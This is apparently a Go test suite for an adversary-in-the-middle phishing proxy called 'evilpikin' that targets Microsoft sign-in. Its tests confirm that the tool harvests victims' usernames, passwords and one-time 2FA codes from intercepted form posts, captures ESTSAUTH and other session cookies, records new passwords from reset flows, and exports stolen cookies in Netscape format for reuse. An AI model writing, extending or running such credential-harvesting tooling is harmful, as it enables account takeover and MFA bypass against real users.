package proxy

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/user/evilpikin/internal/storage"
)

func newMemStore(t *testing.T) *storage.Store {
	t.Helper()
	db := t.TempDir() + "/test.db"
	s, err := storage.OpenSQLite(db)
	if err != nil {
		t.Fatal(err)
	}
	return s
}

func TestParseSetCookie(t *testing.T) {
	cc := parseSetCookie("ESTSAUTH=abc123; Domain=.login.microsoftonline.com; Path=/; Secure; HttpOnly; SameSite=None")
	if cc == nil {
		t.Fatal("nil cookie")
	}
	if cc.Name != "ESTSAUTH" || cc.Value != "abc123" {
		t.Fatalf("bad name/value: %+v", cc)
	}
	if cc.Domain != ".login.microsoftonline.com" {
		t.Fatalf("bad domain: %q", cc.Domain)
	}
	if !cc.Secure || !cc.HttpOnly {
		t.Fatalf("secure/httponly not parsed: %+v", cc)
	}
	if cc.Path != "/" {
		t.Fatalf("bad path: %q", cc.Path)
	}
}

func TestIsAuthCookie(t *testing.T) {
	cases := map[string]bool{
		"ESTSAUTH":          true,
		"ESTSAUTHPERSISTENT": true,
		"RPSSecAuth":        true,
		"SignInStateCookie": true,
		"esctx":             true,
		"theme":             false,
		"locale":            false,
	}
	for name, want := range cases {
		if (storage.CapturedCookie{Name: name}).IsAuthCookie() != want {
			t.Fatalf("IsAuthCookie(%q)=%v want %v", name, !want, want)
		}
	}
}

func TestParseFormEncoded(t *testing.T) {
	form := parseFormEncoded([]byte("loginfmt=victim%40x.com&passwd=secret&x=1"))
	if form["loginfmt"] != "victim@x.com" {
		t.Fatalf("loginfmt=%q", form["loginfmt"])
	}
	if form["passwd"] != "secret" {
		t.Fatalf("passwd=%q", form["passwd"])
	}
}

func TestDetectFlow(t *testing.T) {
	cases := map[string]storage.SessionFlow{
		"/login":                      storage.FlowStandard,
		"/common/oauth2/authorize":    storage.FlowStandard,
		"/resetpassword.aspx":         storage.FlowPasswordReset,
		"/account/forgotpassword":     storage.FlowPasswordReset,
		"/accountverification":        storage.FlowPasswordReset,
	}
	for path, want := range cases {
		if got := detectFlow(path); got != want {
			t.Fatalf("detectFlow(%q)=%v want %v", path, got, want)
		}
	}
}

func TestParseCredentials(t *testing.T) {
	target := &storage.TargetProfile{UsernameField: "loginfmt", PasswordField: "passwd"}
	req := httptest.NewRequest(http.MethodPost, "/login",
		strings.NewReader("loginfmt=victim%40x.com&passwd=hunter2&otc=654321"))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	user, pass, otp, _ := parseCredentials(req, target)
	if user != "victim@x.com" {
		t.Fatalf("user=%q", user)
	}
	if pass != "hunter2" {
		t.Fatalf("pass=%q", pass)
	}
	if otp != "654321" {
		t.Fatalf("otp=%q", otp)
	}
}

func TestRecordCaptureCorrelatesFlow(t *testing.T) {
	target := &storage.TargetProfile{
		ID: "t1", Name: "MS", UsernameField: "loginfmt", PasswordField: "passwd",
	}
	engine := &Engine{store: newMemStore(t), cookieJar: NewCookieJar(""), sessionBySID: map[string]string{}}
	const sid = "testsid"

	// Step 1: email + password
	req := httptest.NewRequest(http.MethodPost, "/login", strings.NewReader("loginfmt=a@b.com&passwd=secret"))
	engine.recordCapture(sid, target, req, "a@b.com", "secret", "", nil, storage.FlowStandard)

	// Step 2: response carries auth cookies
	h := http.Header{}
	h.Add("Set-Cookie", "ESTSAUTH=xyz; Domain=.login.microsoftonline.com; Path=/; Secure; HttpOnly")
	engine.captureResponseCookies(sid, target, h)

	// Step 3: 2FA token entered later in the same flow
	req2 := httptest.NewRequest(http.MethodPost, "/login", strings.NewReader("otc=123456"))
	engine.recordCapture(sid, target, req2, "", "", "123456", nil, storage.FlowStandard)

	id := engine.sessionBySID[sid]
	s, err := engine.store.GetSession(id)
	if err != nil {
		t.Fatal(err)
	}
	if s.Username != "a@b.com" || s.Password != "secret" || s.OTPToken != "123456" {
		t.Fatalf("correlation lost: %+v", s)
	}
	if s.FlowType != storage.FlowStandard {
		t.Fatalf("flow=%v", s.FlowType)
	}
	if !s.IsValid || s.Status != "authorized" {
		t.Fatalf("auth cookies not marked valid: %+v", s)
	}
	if len(s.AuthCookies()) != 1 {
		t.Fatalf("expected 1 auth cookie, got %d", len(s.AuthCookies()))
	}
	if len(s.TelemetryLog) < 4 {
		t.Fatalf("expected telemetry log entries, got %v", s.TelemetryLog)
	}
}

func TestRecordCaptureResetFlow(t *testing.T) {
	target := &storage.TargetProfile{ID: "t1", Name: "MS", UsernameField: "email", PasswordField: "newPassword"}
	engine := &Engine{store: newMemStore(t), cookieJar: NewCookieJar(""), sessionBySID: map[string]string{}}
	const sid = "resetsid"
	req := httptest.NewRequest(http.MethodPost, "/resetpassword.aspx",
		strings.NewReader("email=a@b.com&newPassword=NewSec123!&confirmPassword=NewSec123!"))
	engine.recordCapture(sid, target, req, "a@b.com", "NewSec123!", "", map[string]string{"newPassword": "NewSec123!", "email": "a@b.com"}, storage.FlowPasswordReset)
	s, _ := engine.store.GetSession(engine.sessionBySID[sid])
	if s.FlowType != storage.FlowPasswordReset {
		t.Fatalf("flow=%v", s.FlowType)
	}
	if s.Custom["newPassword"] != "NewSec123!" {
		t.Fatalf("reset password not captured in custom: %+v", s.Custom)
	}
}

func TestNetscapeExport(t *testing.T) {
	target := &storage.TargetProfile{ID: "t1", Name: "MS"}
	engine := &Engine{store: newMemStore(t), cookieJar: NewCookieJar(""), sessionBySID: map[string]string{}}
	const sid = "netsid"
	req := httptest.NewRequest(http.MethodPost, "/login", strings.NewReader("loginfmt=a@b.com&passwd=x"))
	engine.recordCapture(sid, target, req, "a@b.com", "x", "", nil, storage.FlowStandard)
	h := http.Header{}
	h.Add("Set-Cookie", "ESTSAUTH=abc; Domain=.login.microsoftonline.com; Path=/; Secure; HttpOnly")
	engine.captureResponseCookies(sid, target, h)

	id := engine.sessionBySID[sid]
	out, err := engine.store.ExportCookiesNetscape(id)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "ESTSAUTH") || !strings.Contains(out, ".login.microsoftonline.com") {
		t.Fatalf("netscape export missing data:\n%s", out)
	}
	if !strings.Contains(out, "\tTRUE\t/\tTRUE\t1893456000\tESTSAUTH\tabc") {
		t.Fatalf("netscape line malformed:\n%s", out)
	}
}
